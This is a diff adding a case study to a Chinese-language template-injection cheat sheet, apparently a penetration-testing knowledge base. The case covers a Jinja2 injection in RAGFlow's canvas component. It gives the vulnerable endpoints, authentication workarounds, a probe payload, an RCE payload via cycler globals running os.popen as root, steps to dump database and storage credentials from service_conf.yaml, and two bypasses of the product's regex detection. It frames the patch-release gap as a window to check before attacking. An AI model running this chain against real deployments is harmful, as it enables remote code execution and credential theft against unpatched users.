@@ -64,6 +64,29 @@ _通过request参数传递_
 {{request|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__mro__
 ```
 
+**社区实战案例(RAGFlow canvas,2026-08,来源: [xz.aliyun.com/news/92668](https://xz.aliyun.com/news/92668)):**
+
+```
+场景:组件化编排系统把用户填的 script/content 参数直接 new Jinja2Template 渲染。
+入口:/v1/canvas/set 存恶意 DSL → /v1/canvas/completion 触发(SSE 流,curl -N,
+      结果在 node_finished 事件 outputs)。/v1/canvas/debug 接口打不通——它创建的
+      画布不落库,且 params 覆盖不了组件创建时固化的参数
+      (教训:调试接口 ≠ 持久化注入点)。
+认证坑:注册密码要 RSA PKCS1_v1_5 加密(公钥 /ragflow/conf/public.pem,加密对象是
+      base64 后明文);登录凭证在响应头 Authorization,body 里的 access_token
+      是 UUID,拿去调 API 直接 401。
+探测:script={{7*7}} → SSE 返回 result:"49" 确认渲染。
+RCE :{{ cycler.__init__.__globals__.os.popen("id").read() }}  → uid=0(root)
+      (cycler 是 jinja2 自带类,不用找 gadget;同链 cat service_conf.yaml 可拿
+       MySQL/MinIO/ES 全量凭据 → "从 RCE 到数据"的桥)
+检测绕过:①_is_jinjia2 正则 r'\{%.*%\}' 无 DOTALL,{% 与 %} 之间插换行 → 检测 False;
+         ②Message 组件 stream=False 分支根本不调检测,无条件渲染——
+         "正则黑名单的问题不是能被绕过,而是组件之间不统一"。
+修复形态:SandboxedEnvironment(cycler/lipsum/class 链全被 SecurityError 拦)。
+         但"补丁合入 ≠ 漏洞死了":commit 3/2 合入、v0.25.0 4/21 才发布,
+         v0.24.0 用户裸奔两个半月——打点前先对版本窗口。
+```
+
 ---
 
 ### FreeMarker模板注入  `ssti-freemarker`
